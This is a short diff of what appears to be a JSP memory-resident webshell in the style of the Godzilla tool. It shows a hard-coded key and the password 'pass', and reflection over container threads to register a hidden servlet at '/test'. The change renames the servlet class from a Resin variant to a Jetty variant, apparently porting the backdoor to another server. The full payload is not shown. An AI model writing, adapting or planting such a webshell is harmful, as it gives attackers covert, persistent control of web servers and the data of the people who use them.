@@ -12,7 +12,7 @@
 <%@ page import="java.net.URLClassLoader" %>
 <%@ page import="java.net.URL" %>
 <%!
-    class ResinServlet extends HttpServlet {
+    class JettyServlet extends HttpServlet {
         String xc = "3c6e0b8a9c15224a";
         String pass = "pass";
         String md5 = md5(pass + xc);
@@ -110,7 +110,7 @@
 <%
     String servletName = "myServlet";
     String urlPattern = "/test";
-    Servlet servlet = new ResinServlet();
+    Servlet servlet = new JettyServlet();
     Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
     threadMethod.setAccessible(true);
     Thread[] threads = (Thread[]) threadMethod.invoke(null);
